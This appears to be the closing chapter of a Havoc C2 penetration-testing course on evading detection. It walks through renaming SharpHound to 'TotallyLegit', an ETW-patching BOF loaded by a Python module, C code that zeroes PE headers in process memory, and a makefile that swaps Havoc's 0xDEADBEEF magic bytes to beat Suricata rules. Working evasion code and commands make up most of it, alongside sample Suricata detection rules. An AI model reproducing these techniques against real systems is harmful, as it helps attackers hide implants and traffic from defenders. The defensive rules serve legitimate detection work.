## Hiding tool related data and bypassing ETW

Now, it is very important to understand that the presence of the 2 mentioned DLL's in processes does raise suspicion, but does not necessarily mean malicious activity. Of course, if you see `clr.dll` being loaded by `svchost.exe`, you know something's up. But we can do better than that. In this section, we'll take a look at a specific scenario where we will utilize C# inline execution. We'll look at artifacts that might potentially get us caught and understand how we can eliminate those artifacts.

### Understanding ETW

ETW, or Event Tracing for Windows provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers. ETW is implemented in the Windows operating system and provides developers a fast, reliable, and versatile set of event tracing features. 

In a nutshell, the Windows operating system has a number of `providers` running at all times. Providers that are all tasked with collecting data. All providers are tasked with collecting their own set of data. For instance, 1 provider is tasked with collecting data related to powershell execution, another one tasked with collecting data related to .NET execution and so on. All those providers collect data which can then later be used by defenders to scrutinize the evidence. ETW is also widely used by EDR products to identify threats. And when it comes to executing C# code inline, ETW will be our main enemy to defeat. 

### Scenario #1 - Hunting AppDomains

Let's take a look at a scenario. For this, we will simply execute the `SharpHound.exe` binary inline as shown below :

```
01/03/2024 14:29:55 [Neo] Demon » dotnet inline-execute /home/kali/SquidGuard/SharpHound.exe 1.2.3.4

[*] [ACB1D563] Tasked demon to inline execute a dotnet assembly: /home/kali/SquidGuard/SharpHound.exe

[+] Send Task to Agent [184 bytes]
[*] Using CLR Version: v4.0.30319
[+] Received Output [483 bytes]:

2024-03-01T11:29:57.8980991-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2024-03-01T11:29:57.9760769-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-03-01T11:29:57.9760769-08:00|INFORMATION|Initializing SharpHound at 11:29 AM on 3/1/2024
2024-03-01T11:30:03.0068679-08:00|ERROR|Unable to connect to LDAP, verify your credentials
```

From the Havoc Wiki, here's a quick explanation on what happened upon execution of the above command:

The `inline-execute` works by first creating an instance of the CLR (Common Language Runtime) within the current Demon process. After the CLR is created, `amsi.dll` is loaded and patched in-memory to bypass AMSI scanning. Demon then creates an AppDomain and loads the assembly into memory, finding the entry point and passing the commandline args supplied by the user before invoking the method. Output from the assembly is captured and returned to the teamserver.

With this in mind, we will utilize a tool called `Process Hacker` to identify the artifacts left behind by such an execution.

If you wish to use `Process Hacker` yourself, you can do so by downloading it from the below link.

https://processhacker.sourceforge.io/downloads.php

The installation is very simple to do. We simply execute the provided .exe and follow the steps on the screen. Once installed, we'll open `Process Hacker` and analyze the process where our beacon resides. This can be done by simply double-clicking the process in question. From there, you will see many available tabs. For our testing purposes, we will be using both the `.NET assemblies` and `Memory` tabs respectively.

`.NET assemblies` tab example :

![](/assets/imgs/havoc-c2/Pasted image 20240301144914.png)

`Memory` tab example :

![](/assets/imgs/havoc-c2/Pasted image 20240301145040.png)

Going back to our scenario where we executed the `SharpHound` binary inline, let's take a look at what we can see in the `.NET assemblies` tab upon execution. It is very important to keep in mind that after the execution of the binary is done, Havoc automatically unloads the AppDomain associated with our C# executable in memory. As a result, if our C# binary has finished executing and output was received back in the Havoc console, we won't be able to see what exactly has happened in `Process Hacker`. Additionally, please note that `Process Hacker` does not automatically update values in the `.NET assemblies` tab unless we exit and open the properties of the process again. To circumvent this problem, we will take a series of steps which are outlined below.

* Open Process Hacker.

![](/assets/imgs/havoc-c2/Pasted image 20240302142930.png)
* Execute the inline-execution in Havoc.

```
01/03/2024 14:29:55 [Neo] Demon » dotnet inline-execute /home/kali/SquidGuard/SharpHound.exe 1.2.3.4

[*] [ACB1D563] Tasked demon to inline execute a dotnet assembly: /home/kali/SquidGuard/SharpHound.exe

[+] Send Task to Agent [184 bytes]
[*] Using CLR Version: v4.0.30319
[+] Received Output [483 bytes]:

2024-03-01T11:29:57.8980991-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2024-03-01T11:29:57.9760769-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-03-01T11:29:57.9760769-08:00|INFORMATION|Initializing SharpHound at 11:29 AM on 3/1/2024
2024-03-01T11:30:03.0068679-08:00|ERROR|Unable to connect to LDAP, verify your credentials
```

* While the execution is happening(make sure that execution has not finished when doing this), we will double-click on our beacon process.

![](/assets/imgs/havoc-c2/Pasted image 20240302143124.png)

* We will browse to the `.NET assemblies` tab.

![](/assets/imgs/havoc-c2/Pasted image 20240302143338.png)

* We will analyze the artifacts present as a result of the execution

![](/assets/imgs/havoc-c2/Pasted image 20240301144715.png)

As you can see in the screenshot above, the `SharpHound` AppDomain immediately stands out. Thus, if an EDR product is used within the environment, the presence of this artifact will immediately generate an alert. Now that we have this piece of information in sight, let's take a look at how we can alter the `AppDomain` to avoid getting detected.

We have decided to download a fresh copy of `SharpHound` from the link below : 

https://github.com/BloodHoundAD/SharpHound

If we take a look at the `Sharphound.csproj` file specifically, we will find this part : 

![](/assets/imgs/havoc-c2/Pasted image 20240302190938.png)

What you see in the screenshot above, is just some information about the C# project. However, this information will also be part of the executable upon compilation. For example, we see the `AssemblyName` value set to `SharpHound`. Thus, when this C# binary is used, the AppDomain will always be `SharpHound`. And if you recall the screenshot in which we looked at the loaded AppDomains upon the execution of SharpHound inline, we do in fact see the AppDomain being `SharpHound`.

![](/assets/imgs/havoc-c2/Pasted image 20240301144715.png)

Now of course `SharpHound` isn't the best of names to give to our assemblies. However, we could specify another arbitrary name. Something that does not seem malicious at first glance. For this example, we have decided to set the `AssemblyName` to `TotallyLegit`.

![](/assets/imgs/havoc-c2/Pasted image 20240302191915.png)

With this modification done, we can move ahead with the compilation. To ensure proper compilation, we ensure that the `Release` option is set as well as setting the compilation architecture to `x64`.

![](/assets/imgs/havoc-c2/Pasted image 20240302220321.png)
Next, we select `Build Solution` from the `Build` menu.

![](/assets/imgs/havoc-c2/Pasted image 20240302220402.png)

A successful build should show the following output in the console.

![](/assets/imgs/havoc-c2/Pasted image 20240302220435.png)

We can then transfer the resulting `TotallyLegit.exe` executable to our Kali machine. In our case, we have decided to perform the transferring utilizing `scp`.

```
C:\Users\Administrator>scp  C:\Users\Administrator\Downloads\SharpHound-2.X\SharpHound-2.X\bin\x64\Release\net462\TotallyLegit.exe kali@10.250.0.16:/home/kali/SquidGuard/TotallyLegit.exe
kali@10.250.0.16's password:
TotallyLegit.exe                                                                      100% 1304KB  20.5MB/s   00:00

C:\Users\Administrator>
```

Now that we have the executable on our attacking VM, we can repeat the steps we took previously. Let's check at how the results differ in `Process Hacker` this time.

```
01/03/2024 20:17:43 [Neo] Demon » dotnet inline-execute /home/kali/SquidGuard/TotallyLegit.exe 1.2.3.4

[*] [938D6E0A] Tasked demon to inline execute a dotnet assembly: /home/kali/SquidGuard/TotallyLegit.exe

[+] Send Task to Agent [194 bytes]
[*] Using CLR Version: v4.0.30319
[+] Received Output [1705 bytes]:

2024-03-02T19:10:22.6057847-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2024-03-02T19:10:22.6685720-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices
2024-03-02T19:10:22.6840593-08:00|INFORMATION|Initializing SharpHound at 7:10 PM on 3/2/2024
2024-03-02T19:10:27.7460595-08:00|WARNING|[CommonLib LDAPUtils]Failed to setup LDAP Query Filter: Error creating LDAP connection: GetDomain call failed for
2024-03-02T19:10:27.7460595-08:00|ERROR|Error running SharpHound: Failed to setup LDAP Query Filter
```

![](/assets/imgs/havoc-c2/Pasted image 20240302222027.png)

As you can see, we were able to hide references to `SharpHound` partially. An AppDomain for `SharpHoundCommonLib` still exists. This is due to the fact that SharpHound utilizes additional packages for compilation.

![](/assets/imgs/havoc-c2/Pasted image 20240302222316.png)

When compilation is started, Visual Studio attempts to download the packages from https://nuget.org.

![](/assets/imgs/havoc-c2/Pasted image 20240302222553.png)

So in order to hide the reference to `SharpHoundCommonLib`, we would also need to update the values in this package as well. This can of course be done though not necessary. For now, we'll assume that we did in fact change up the values everywhere(even in the individual packages). With this being said, let's move on and see what else we would need to patch up in our binary. You might be wondering why we're skipping the patching of the `SharpHoundCommonLib`. We'll explain this in just a moment.

### Scenario #1 - Hunting for Methods

As we saw before, references to SharpHound would need to be patched up in order to avoid detection. However, as we will see in this section, we will need to patch up quite a lot of things in our binary to achieve the desired result. Patching the `AssemblyName`is one thing, now let's check out the rest. We previously mentioned that ETW uses providers to collect data but this data needs to be collected somehow right? This is where the term `Consumers` comes in. Consumers are used to get all the data that was collected by the providers. With that being said, we can write our own custom Consumer that will collect data related to `.NET` assemblies. This way, we will be able to see all the references to SharpHound that are made when executing it inline. The consumer we will be using for this example has been written by Adam Chester and can be found here :

https://gist.github.com/xpn/41f193cf1bdeeee19ebd351b19cff45c

This code is written in C and needs to be compiled in Visual Studio. In order for the compilation to work, you need to have installed `Desktop development with C++` package within Visual Studio. From there, simply open the C code in Visual Studio, set the CPU to x64 and compile it as a release. From our testing, we have found that a small modification is required to make the code work with newer versions of C.

On line 106, please update it to:

`hTrace = OpenTrace(&trace);` --> `hTrace = OpenTraceA(&trace);`

Once that's done, we perform the compilation and execute the provided executable. Next, we execute the same SharpHound binary we have created prior in Havoc. While the execution is happening, you will see a lot of output coming in. Let's take a look at the more notable parts.


![](/assets/imgs/havoc-c2/Pasted image 20240303130555.png)

![](/assets/imgs/havoc-c2/Pasted image 20240303130611.png)

As you can see, if we dig deeper into the output that ETW can provide us, we can also see the method names that are being invoked by our C# executable. Now of course, we can rename those methods so that they don't look as fishy, however there's a simpler approach to the problem. Bypassing ETW.
### Bypassing ETW

While we can update all malicious text in our C# code(AssemblyName, method names, etc), it is very time consuming and we would need to repeat the process for al our C# executables. But let's stop and think for a second. All those things that can give us away are the result of ETW performing its intended role. Remember how we were able to bypass AMSI in a previous section? Well, ETW can be bypassed in a similar manner. In this section, we'll explore a custom BOF that will allow us to patch ETW. As a result of ETW failing to operate, all the strings and method names that clearly indicate malicious activity will be completely gone, thus providing an extra level of stealth for us against defenders.

The BOF that we will be using can be found here : 

https://github.com/ajpc500/BOFs/tree/main/ETW

In a nutshell, we aim at patching **ntdll!EtwEventWrite** in memory with a specific sequence of bytes. For more details on how this specific BOF operates, please visit the below resource :

https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/

Let's take a look at what we've done for our setup. First, we started by cloning the GitHub repository.

```
➜  SquidGuard git clone https://github.com/ajpc500/BOFs.git
Cloning into 'BOFs'...
remote: Enumerating objects: 161, done.
remote: Counting objects: 100% (26/26), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 161 (delta 8), reused 8 (delta 8), pack-reused 135
Receiving objects: 100% (161/161), 145.76 KiB | 1.66 MiB/s, done.
Resolving deltas: 100% (81/81), done.
```

From there, we created the directory in which our new ETW bypass module will reside in. For simplicity purposes, we decided to call the module `etw`.

`Havoc/client/Modules/etw`

Following this, we wrote the python script that will be associated with our module. Let's take a look at it.

```
from havoc import Demon, RegisterCommand
from struct import pack, calcsize


class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)


def etw(demonID, *param):
    TaskID: str = None
    demon: Demon = None
    demon = Demon(demonID)

    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK, "Tasked beacon to patch ETW")

    Task = Packer()
    Task.addstr( param [ 0 ] )

    if demon.ProcessArch == "x86":
        demon.InlineExecute(TaskID, "go", f"etw.x86.o", Task.getbuffer(), False)
    else:
        demon.InlineExecute(TaskID, "go", f"etw.x64.o", Task.getbuffer(), False)

    return TaskID


RegisterCommand(etw, "", "etw", "in process ETW patch", 0, "start or stop", '')
```

You should be familiar by now with most of the parts in this code as they're mostly the same. However, since this BOF is available for both x86 and x64 bit, we've decided to add an additional `if` statement at the end to verify the architecture of the target process to choose the appropriate version of the BOF.

Apart from that, our BOF will be registered under the `etw` command.

With this said, now we just need to make sure that all files are present in the right directory.

Here's how the structure should look like :

```
➜  etw git:(main) ✗ cp ~/SquidGuard/BOFs/ETW/etw.x86.o .
➜  etw git:(main) ✗ cp ~/SquidGuard/BOFs/ETW/etw.x64.o .
➜  etw git:(main) ✗ ls -la
total 20
drwxr-xr-x  2 kali kali 4096 Mar  2 03:49 .
drwxr-xr-x 21 kali kali 4096 Mar  2 03:45 ..
-rw-r--r--  1 kali kali  945 Mar  2 03:49 etw.py
-rw-r--r--  1 kali kali 2245 Mar  2 03:49 etw.x64.o
-rw-r--r--  1 kali kali 2013 Mar  2 03:49 etw.x86.o
```

As you can see, we are in the `etw` directory that we've created earlier specifically for this module. We have our actual module (`etw.py`) as well as both the BOF's for x86 and x64 respectively.  Now that our module is good to go, let's load it up into Havoc.

Like before, it's important to make sure that the module has been successfully loaded and is free of errors :

![](/assets/imgs/havoc-c2/Pasted image 20240303173257.png)

![](/assets/imgs/havoc-c2/Pasted image 20240303173848.png)

Looks like it's all working and ready to be used. Let's attempt to stop ETW monitoring first : 

![](/assets/imgs/havoc-c2/Pasted image 20240303175536.png)

Appears to have worked. Now if we try to run SharpHound.exe inline, we will see absolutely nothing in the `.NET assemblies` tab in `Process Hacker` : 

![](/assets/imgs/havoc-c2/Pasted image 20240303175624.png)

Our bypass was successful! So no need to patch up every single tool we have. Bypassing ETW as a whole was enough to get rid of the entire evidence. Or was it enough?

### Digging even deeper into C# inline execution

Previously, we cleared up all the evidence that ETW can provide defenders with. This evidence is enough to get us caught during an engagement. But now that we got rid of this evidence, are we really that undetectable? Well, our footprint has been significantly reduced; though not entirely. In this section, we'll take a look at the memory tab in `Process Hacker` to see if any artifacts are present in memory as a result of executing C# code inline. If we attempt to run our `SharpHound.exe` binary inline once again in Havoc and check out memory data, we will stumble upon this find :

![](/assets/imgs/havoc-c2/Pasted image 20240303214835.png)

The "This program cannot be run in DOS mode" line is very popular and is present in almost every modern executable's header. Now in our case, seeing this immediately should raise suspicion as this means that there's a process on the system that contains another program loaded within its memory which is not typical behavior. Additionally, remember how we mentioned that Havoc automatically unloads AppDomains after the execution has finished? Well, it's a little different when it comes to memory. Even after the executable has finished running, this header will still remain in memory. Reason being, the executable, once loaded into memory, isn't unloaded automatically by Havoc after execution. Thus, this leaves a trace that can potentially get us exposed. With this being said, let's look at a few ways we can use to circumvent this issue.

## Stomping PE header - Method #1

The first method that we will be looking at involves adding some custom code into our C# assemblies. This custom code will be responsible for stomping the PE header at the beginning or the end of the assembly's execution. Let's take a look at the code in question : 

![](/assets/imgs/havoc-c2/Pasted image 20240316153529.png)

In a nutshell, we will be iterating through memory regions and zeroing out the memory in question. As a result, the PE header will be erased and thus reducing our footprint. Seems like a good way to stomp the PE header right? Well it is, although we would need to add this piece of code to all our C# assemblies which can be a very time consuming task depending on the amount of C# assemblies you normally use. Nonetheless, it is a valid way to stomp the PE header and it is worth considering as part of your offensive tradecraft.

## Stomping PE header - Method #2

Let's now take a look at another method. If for whatever reason, you are not able to incorporate the code from the previous section into your C# tradecraft, no worries - you can always clear the PE header afterwards. For our purposes, we'll use the following C code : 

```sql
#include <windows.h>
#include <stdio.h>
#include <string.h>

void zero_dos_mode_string(HANDLE hProcess) {
    SYSTEM_INFO sysInfo;
    MEMORY_BASIC_INFORMATION memInfo;
    const char *target = "This program cannot be run in DOS mode";
    size_t targetLen = strlen(target);
    char *buffer;
    SIZE_T bytesRead;

    GetSystemInfo(&sysInfo);

    for (char *addr = 0; addr < sysInfo.lpMaximumApplicationAddress; addr += memInfo.RegionSize) {
        if (VirtualQueryEx(hProcess, addr, &memInfo, sizeof(memInfo)) == sizeof(memInfo)) {
            if (memInfo.State == MEM_COMMIT && memInfo.Protect != PAGE_NOACCESS) {
                buffer = (char *)malloc(memInfo.RegionSize);
                if (ReadProcessMemory(hProcess, addr, buffer, memInfo.RegionSize, &bytesRead)) {
                    for (SIZE_T i = 0; i <= bytesRead - targetLen; i++) {
                        if (memcmp(buffer + i, target, targetLen) == 0) {
                            char *zeroBuffer = (char *)calloc(targetLen, 1);
                            WriteProcessMemory(hProcess, addr + i, zeroBuffer, targetLen, NULL);
                            free(zeroBuffer);
                            printf("Zeroed out occurrence at address: %p\n", addr + i);
                        }
                    }
                }
                free(buffer);
            }
        }
    }
}

int main() {
    HANDLE hProcess = GetCurrentProcess();
    zero_dos_mode_string(hProcess);
    printf("Memory scan complete.\n");
    return 0;
}
```

In a nutshell, we are declaring the `target` variable and we're specifying our PE header in it. The rest of the code simply initiates an enourmous loop that will go through the entire memory of the current process looking for any occurrence of `This program cannot be run in DOS mode`. And if this string is found at any place in memory, it will be zeroed out. Let's now compile our binary : 

```bash
┌──(ori㉿ori)-[~/…/client/testing]
└─$ ls -la   
total 12
drwxrwxr-x 2 ori ori 4096 Aug 29 19:02 .
drwxrwxr-x 3 ori ori 4096 Aug 29 19:00 ..
-rw-rw-r-- 1 ori ori 1510 Aug 29 19:02 test.c
                                                                                                                                                                                                                  
┌──(ori㉿ori)-[~/…/client/testing]
└─$ x86_64-w64-mingw32-gcc -o zero_dos_string.exe test.c
test.c: In function ‘zero_dos_mode_string’:
test.c:15:31: warning: comparison of distinct pointer types lacks a cast
   15 |     for (char *addr = 0; addr < sysInfo.lpMaximumApplicationAddress; addr += memInfo.RegionSize) {
      |                               ^
                                                                                                                                                                                                                  
┌──(ori㉿ori)-[~/…/client/testing]
└─$ ls    
test.c  zero_dos_string.exe
                                                                                                                                                                                                                  
┌──(ori㉿ori)-[~/…/client/testing]
└─$ 
```

With this program ready, we now have the choice of using `noconsolation` or our previously discussed `perun` BOF to run this binary in memory. We'll move ahead with the `noconsolation` approach for this demo.

Let's fire up `Process Hacker` and locate our PE header - of course, you would need to use Havoc's `dotnet inline-execute` command prior to get the header in memory.

![](/assets/imgs/havoc-c2/Pasted image 20240830092250.png)

Alrighty, let's make note of that address and execute our binary to stomp the header :

![](/assets/imgs/havoc-c2/Pasted image 20240830092439.png)

From here, let's click on the `Refresh` button at the top right in `Process Hacker` and review the memory once again : 

![](/assets/imgs/havoc-c2/Pasted image 20240830092615.png)

Great! We were able to stomp the PE header. You might have noticed that our binary has given us lots of output when we ran it and here's the cool thing - It clears out every PE header found in the process' memory meaning that every occurrence will be zeroed out.

# Stomping Other Data In Memory

Similarly, we can also zero out other pieces of data in memory. For example, the `amsipatch` BOF that we had incorporated earlier leaves some artifacts in memory :

![](/assets/imgs/havoc-c2/Pasted image 20240303180053.png)

Feel free to adjust the C source code provided the previous section to clear out other data from memory such as this.

# IDS/IPS detections - Suricata

In this last section, we'll take a look at how our Havoc beacon could potentially be spotted by an IDS/IPS system such as `Suricata` or `Snort`. These systems give defenders the possibility to write custom rules to detect malicious activity. We'll focus on analyzing a few sample rules and see how we can bypass them. But before that, let's quickly walk through the Suricata setup.

## Installation

First off, let's begin with the installation. To install Suricata, all we need to do is run a system apt install command : 

```
sudo apt install -y suricata
```

From there, we'll need to verify that the installation was successful using the below command : 

![](/assets/imgs/havoc-c2/Pasted image 20240908184734.png)

Next, we can configure Suricata to start on boot : 

```
sudo systemctl enable suricata 
sudo systemctl start suricata
```

## Configuration

Let's proceed with the configuration. The very first thing we'll do is make sure that Suricata is running on our desired interface. We'll need to edit the following file : 

```
sudo nano /etc/suricata/suricata.yaml
```

Find the following lines and update them accordingly : 

![](/assets/imgs/havoc-c2/Pasted image 20240908185011.png)

## Adding Our First Rule

Alrighty, we're half way there. Let's now create our first test rule that would be responsible for detecting the default `User-Agent` the Havoc C2 uses in its http traffic.

To do so, we will browse to `/etc/suricata/rules` and create a file called `detect-havoc-header.rules` :

```sql
root@ori-virtual-machine:/etc/suricata/rules# cat detect-havoc-header.rules 
alert http any any -> any any (msg:"Detect Havoc Default User Agent"; http.header; content:"User-Agent"; http.header; content:"Mozilla/5.0 (Windows NT 6.1\; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"; nocase; sid:90; rev:6;)
root@ori-virtual-machine:/etc/suricata/rules# 
```

The User-Agent that we have used in this rule corresponds to the default one used by Havoc : 

![](/assets/imgs/havoc-c2/Pasted image 20240908221926.png)

With the rule created, let's now open `/etc/suricata/suricata.yaml` and add our new rule under the `rule-files` section :

![](/assets/imgs/havoc-c2/Pasted image 20240908185713.png)

From there, we'll update the suricata rule database using `sudo suricata-update` as show below : 

![](/assets/imgs/havoc-c2/Pasted image 20240908185803.png)

And lastly, we need to restart the Suricata service : 

```
sudo systemctl restart suricata
```

Our Suricata setup is now complete. In the next section, we'll see if our rule triggers any alerts.

## Testing Our First Rule

Now from here, the network setup required for testing the rule is up to you. The only thing to keep in mind is that all traffic must pass through the machine on which Suricata is installed so that packet inspection can be performed. As you might have noticed in the Havoc screenshot above, we specified an HTTP proxy to be used for our beacon. We have setup a `SQUID` proxy on port 3128 on the Suricata host that will be responsible for forwarding packets. That way, we are able to receive the packets; get them analyzed by Suricata as well as redirect them to the proper location(our kali linux VM) using our proxy. 

If you're interested in replicating our setup, here are the necessary steps : 
``
```bash
# Installation

sudo apt install squid -y

# Add the following lines to /etc/squid/squid.conf for proper packet forwarding

http_access allow all
acl localnet src 0.0.0.0/0
acl SSL_ports port 1-65535
acl Safe_ports port 1-65535

# Start service and enable it to start on boot
service squid start
systemctl enable squid
```

Now, all that's left to do is execute the actual exe binary from Havoc on the Windows host. The beacon should pass through our squid proxy host on which Suricata is running. The packet will be received, scanned by Suricata and redirected to the appropriate location by the Squid proxy. And, we can indeed verify that our rule works as intended : 

![](/assets/imgs/havoc-c2/Pasted image 20240908222710.png)
# Countering the first rule

I'm sure you already have a few days as to how we can counter this rule. First and foremost, we can always change the User-Agent from the default value to something more uncommon. Additionally, Suricata is able to identify this because the HTTP protocol is unencrypted thus, we could of generated a beacon that would communicate over HTTPS on port 443. This way, all the traffic would be encrypted and Suricata won't be able to perform any inspection. However, there are multiple ways to implement HTTPS decryption and only then pass this data to Suricata for analysis. We won't go over this method in this course though if you're willing to see this be presented at some point, do let us know. From our standpoint, we will continue with the assumpting that deep SSL inspection is implemented and that Suricata is able to view the packets in clear text.

# Second Rule Testing

Alrighty, now that we've had the chance to look at our first rule. Let's implement something a bit more robust. This section is based on : https://www.immersivelabs.com/blog/havoc-c2-framework-a-defensive-operators-guide/. As per the research mentioned above, there's an interesting sequence of magic bytes that can be found in packets specific to the Havoc C2 : 

![](/assets/imgs/havoc-c2/Pasted image 20240916153931.png)

It seems that the bytes `de ad be ef` can be found in the Havoc's TCP traffic data. Let's take a look at our own traffic and verify that this is indeed the case.

![](/assets/imgs/havoc-c2/Pasted image 20240916154040.png)

Additionally, as outline by the post, this magic value can be found in the `Defines.h` file in Havoc's source files.

![](/assets/imgs/havoc-c2/Pasted image 20240916155102.png)

We went ahead and verified this for ourselves to make sure that it's still relevant : 

![](/assets/imgs/havoc-c2/Pasted image 20240916155250.png)

It still is the case! Let's now take a look at a sample Havoc rule that we can use to alert on these specific bytes. Please be aware that the following rule is prone to false positives although finding the string `deadbeef` in a legitimate packet is very unlikely.

**This rule is saved in /etc/suricata/rules

```bash
root@ori-virtual-machine:/etc/suricata/rules# cat detect-bytes.rules 
alert tcp any any -> any any (msg:"Detected byte sequence DE AD BE EF"; content:"|DE AD BE EF|"; sid:1000001; rev:1;)
root@ori-virtual-machine:/etc/suricata/rules# 
```

From there, we will once again run the following 2 commands to reload Suricata with our updated rule : 

```
sudo suricata-update
sudo systemctl restart suricata
```

After executing our beacon on Windows, we will see that our previous User-Agent rule triggers as well as the new one that we implemented.

![](/assets/imgs/havoc-c2/Pasted image 20240916160244.png)

We will stop here, though if you're interested, you can keep on reading https://www.immersivelabs.com/blog/havoc-c2-framework-a-defensive-operators-guide/ for more advanced packet traffic analysis related to the Havoc C2.
# Countering the second rule

As you can see, based on the User-Agent and some small bytes in the traffic, we can identify potentially malicious traffic. It's also important to note that these are all default values(meaning experienced attackers will likely change them before attacking an environment). The rules that we have created so far only apply to the Havoc C2 because of specific keywords/bytes that we have utilized. However, the same methodologies can be applied for other C2's as well. For more details, feel free to read up more on the subject in the following PDF :  https://repositorio-aberto.up.pt/bitstream/10216/142718/2/572020.pdf

So, what do we do to invalidate the rule we just created? You definitely guessed, we can simply modify the magic byte in the `Defines.h` file and recompile both the client and the team server.

![](/assets/imgs/havoc-c2/Pasted image 20240916161018.png)

To avoid confusion, let's clone the Havoc repository once again and create an entirely new build for both the client and the team server.

# Changing our Packet Footprint

Now you might be tempted to just swap the `0xDEADBEEF` value in `Defines.h` and generate a new beacon to make this work. Unfortunately, it's more complicated than that, you see the `0xDEADBEEF` is also used in numerous other spots in Havoc's code.

![](/assets/imgs/havoc-c2/Pasted image 20240916163819.png)

To make this work, you would need to swap out the `0XDEADBEEF` value in every single one of these files. Worry not, let's walk through this together!

Firstly, we will clone the repo and install the necessary dependencies for the team server :

```sql
$ git clone https://github.com/HavocFramework/Havoc.git
$ cd Havoc
$ cd teamserver
$ go mod download golang.org/x/sys
```

From there, we'll go back to the Havoc root directory and update the `makefile` with the following contents : 

```
$ cd .. # We want to go back to ~/Havoc
```

```bash
ifndef VERBOSE
.SILENT:
endif

# main build target. compiles the teamserver and client
all: ts-build client-build

# teamserver building target
ts-build:
        @ echo "[*] building teamserver"
        @ ./teamserver/Install.sh
        @ find . -type f -exec sed -i 's/0x[dD][eE][aA][dD][bB][eE][eE][fF]/0xaabbccdd/g' {} + 2>/dev/null
        @ cd teamserver; GO111MODULE="on" go build -ldflags="-s -w -X cmd.VersionCommit=$(git rev-parse HEAD)" -o ../havoc main.go
        @ sudo setcap 'cap_net_bind_service=+ep' havoc # this allows you to run the server as a regular user

dev-ts-compile:
        @ echo "[*] compile teamserver"
        @ cd teamserver; GO111MODULE="on" go build -ldflags="-s -w -X cmd.VersionCommit=$(git rev-parse HEAD)" -o ../havoc main.go 

ts-cleanup: 
        @ echo "[*] teamserver cleanup"
        @ rm -rf ./teamserver/bin
        @ rm -rf ./data/loot
        @ rm -rf ./data/x86_64-w64-mingw32-cross 
        @ rm -rf ./data/havoc.db
        @ rm -rf ./data/server.*
        @ rm -rf ./teamserver/.idea
        @ rm -rf ./havoc

# client building and cleanup targets 
client-build: 
        @ echo "[*] building client"
        @ git submodule update --init --recursive
        @ find . -type f -exec sed -i 's/0x[dD][eE][aA][dD][bB][eE][eE][fF]/0xaabbccdd/g' {} + 2>/dev/null
        @ mkdir client/Build; cd client/Build; cmake ..
        @ if [ -d "client/Modules" ]; then echo "Modules installed"; else git clone https://github.com/HavocFramework/Modules client/Modules --single-branch --branch `git rev-parse --abbrev-ref HEAD`; fi
        @ find . -type f -exec sed -i 's/0x[dD][eE][aA][dD][bB][eE][eE][fF]/0xaabbccdd/g' {} + 2>/dev/null
        @ cmake --build client/Build -- -j 4

client-cleanup:
        @ echo "[*] client cleanup"
        @ rm -rf ./client/Build
        @ rm -rf ./client/Bin/*
        @ rm -rf ./client/Data/database.db
        @ rm -rf ./client/.idea
        @ rm -rf ./client/cmake-build-debug
        @ rm -rf ./client/Havoc
        @ rm -rf ./client/Modules


# cleanup target 
clean: ts-cleanup client-cleanup
        @ rm -rf ./data/*.db
        @ rm -rf payloads/Demon/.idea
```

Here are the changes that were made to the original file : 

![](/assets/imgs/havoc-c2/Pasted image 20240916222145.png)

As you can see, we added a few instances of find/sed combinations in order to substitute every instance of `0xdeadbeef` for `0xaabbccdd` as those are our chosen magic bytes. Keep in mind that the magic bytes that you choose must be exactly 4 bytes long otherwise the flow will be broken. After making those changes, save the file.

Now you're ready to make the actual builds :

```
$ make ts-build
$ make client-build
```

When the builds complete, you can start the server : 

```bash
$ sudo ./havoc server --profile ./profiles/havoc.yaotl -v --debug
```

And use the client to connect : 

```bash
$ ./havoc client
```

From there, you can create a new listener and proceed to create a payload. Upon executing this payload on the Windows target, we observe the new magic bytes in effect :

![](/assets/imgs/havoc-c2/Pasted image 20240916221855.png)

Additionally, we can also verify that our rule matching for `0xdeadbeef` does not trigger anymore and that only our User-Agent rule triggers as expected :

![](/assets/imgs/havoc-c2/Pasted image 20240916222652.png)

And that wraps up our Suricata section! The rules that we've showcased are really basic but nonetheless effective at determining malicious traffic. We primarily targeted default Havoc values that if unchanged, can be clear indications of compromise. More experienced attackers will definitely swap the default values to something else to increase their stealth levels. This makes detecting C2 traffic a lot more complex and we should turn behavioral based analysis now. We will definitely cover this in a future course!
# Words of goodbye and Thank you

Alrighty folks, that concludes our `Havoc C2 Pentesting` course. We hope that you've enjoyed it as much as we loved making it. We hope you'll check out other courses of ours in the future! Before we part ways, here are a few resources that we have used while creating this course and that might be useful for your own personal development.

https://github.com/wsummerhill/CobaltStrike_BOF_Collections

https://github.com/ajpc500/BOFs

https://github.com/N7WEra/BofAllTheThings

https://trustedsec.com/blog/situational-awareness-bofs-for-script-kiddies

https://github.com/m57/cobaltstrike_bofs

https://github.com/HavocFramework/Modules

https://repositorio-aberto.up.pt/bitstream/10216/142718/2/572020.pdf

https://www.immersivelabs.com/blog/havoc-c2-framework-a-defensive-operators-guide/